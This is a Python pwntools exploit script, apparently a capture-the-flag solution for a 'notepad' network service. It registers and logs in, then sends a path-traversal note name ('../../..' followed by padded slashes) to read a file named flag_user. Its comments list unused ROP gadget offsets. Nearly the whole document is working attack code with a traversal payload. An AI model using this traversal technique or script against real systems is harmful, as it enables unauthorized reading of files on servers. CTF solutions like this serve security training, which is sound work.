from pwn import *

# 0x000000000002a3e5: pop rdi; ret;
# 0x000000000002be51: pop rsi; ret;
# 0x00000000000796a2: pop rdx; ret; 

context.arch = 'amd64'
port = sys.argv[1]
# r = process('./share/notepad')
r = remote('10.113.184.121', port)

def Login(username, password):
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('Username: ')
    r.sendline(username)
    r.recvuntil('Password: ')
    r.sendline(password)

def Register(username, password):
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('Username: ')
    r.sendline(username)
    r.recvuntil('Password: ')
    r.sendline(password)
    
def NewNote(note_name, content_length, content):
    r.recvuntil('> ')
    r.sendline('3')
    r.sendlineafter('Note Name: ', note_name)
    r.sendlineafter('Content Length: ', content_length)
    r.sendlineafter('Content: ', content)
    
def EditNoteName(name, offset, length, content):
    r.recvuntil('> ')
    r.sendline('4')
    r.sendlineafter('Note Name: ', name)
    r.sendlineafter('Offset: ', offset)
    r.sendlineafter('Content Length: ', length)
    r.sendlineafter('Content: ', content)

def ShowNote(note_name, offset):
    r.recvuntil('> ')
    r.sendline('5')
    r.sendlineafter('Note Name: ', note_name)
    r.sendlineafter('Offset: ', offset)
    res = r.recvline().decode().strip()
    return res
    
file_path  = b'../../..//////////////////////////////////////////////////////////////////////////////////////////flag_user'
Register('admin', 'admin')
Login('admin', 'admin')
flag_context = ShowNote(file_path, '0')
print(flag_context)

r.interactive()
